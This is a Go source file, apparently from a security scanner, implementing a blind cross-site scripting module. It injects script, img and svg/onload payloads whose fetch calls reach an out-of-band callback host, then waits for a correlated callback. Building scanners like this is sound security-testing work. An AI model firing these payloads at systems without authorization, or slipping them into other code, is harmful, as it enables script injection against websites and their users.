package modules

import (
	"context"
	"strings"

	"github.com/akha-security/akca/engine/internal/payloadgen"
)

func (r *Runner) runBlindXSS(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("blind_xss", target); !ok {
		r.emitSkip("blind_xss", target, reason)
		return nil
	}
	if !isLikelyBlindXSSParam(target.Parameter, target.Location) {
		return nil
	}
	if !r.cfg.EnableOAST || r.oast == nil {
		r.emitOnce("blind_xss_oast_listener_unavailable", "coverage_gap", "Blind XSS coverage unavailable because OAST is disabled or not running", map[string]interface{}{
			"module": "blind_xss", "endpoint": target.EndpointURL,
		})
		return nil
	}
	oastURL := strings.TrimSpace(r.oastURL(ctx, "blindxss-"+target.Parameter, target, "blind_xss"))
	if oastURL == "" {
		r.emitOnce("blind_xss_oast_url_unavailable", "coverage_gap", "Blind XSS OAST URL generation failed", map[string]interface{}{
			"module": "blind_xss", "endpoint": target.EndpointURL,
		})
		return nil
	}
	delivered := 0
	for _, p := range blindXSSPayloads(oastURL) {
		if ctx.Err() != nil {
			break
		}
		if r.sendOASTProbe(ctx, target, p.Value) {
			delivered++
		}
	}
	if delivered > 0 {
		_ = r.emit("oast_verification_pending", "blind XSS probes delivered; awaiting a correlated callback", map[string]interface{}{
			"scan_id": r.scanID, "module": "blind_xss", "endpoint": target.EndpointURL,
			"parameter": target.Parameter, "location": target.Location,
			"probes_delivered": delivered, "verification": "oast_callback_required",
		})
	}
	return nil
}

func isLikelyBlindXSSParam(param, location string) bool {
	p := strings.ToLower(strings.TrimSpace(param))
	if p == "" {
		return false
	}
	// Skip static/numeric/pagination/tracking parameters
	switch p {
	case "page", "p", "pg", "limit", "offset", "size", "per_page", "perpage",
		"sort", "order", "dir", "direction", "by", "orderby",
		"v", "ver", "version", "_", "t", "ts", "timestamp", "cb", "cache", "nocache",
		"format", "lang", "locale", "id", "item_id", "user_id", "post_id", "product_id":
		return false
	}
	// Body/JSON parameters or form submissions are always high priority
	if location == "body" || location == "json" || location == "form" {
		return true
	}
	return true
}

func blindXSSPayloads(oastURL string) []payloadgen.Payload {
	url := strings.TrimSpace(oastURL)
	if url == "" {
		return nil
	}
	probes := []struct {
		variant, value string
		priority       int
	}{
		{"script_src", `<script src="` + url + `"></script>`, 78},
		{"img_src", `<img src="` + url + `">`, 76},
		{"svg_onload", `<svg/onload="fetch('` + url + `')">`, 74},
	}
	out := make([]payloadgen.Payload, 0, len(probes))
	for _, pr := range probes {
		out = append(out, payloadgen.Payload{
			Value: pr.value, VulnClass: "blind_xss", Variant: pr.variant, Family: "xss",
			ExpectedSignal: "blind_oast", Priority: pr.priority, BudgetCost: 2,
			VerificationStrategy: "oast_callback", NoiseLevel: "medium",
		})
	}
	return out
}
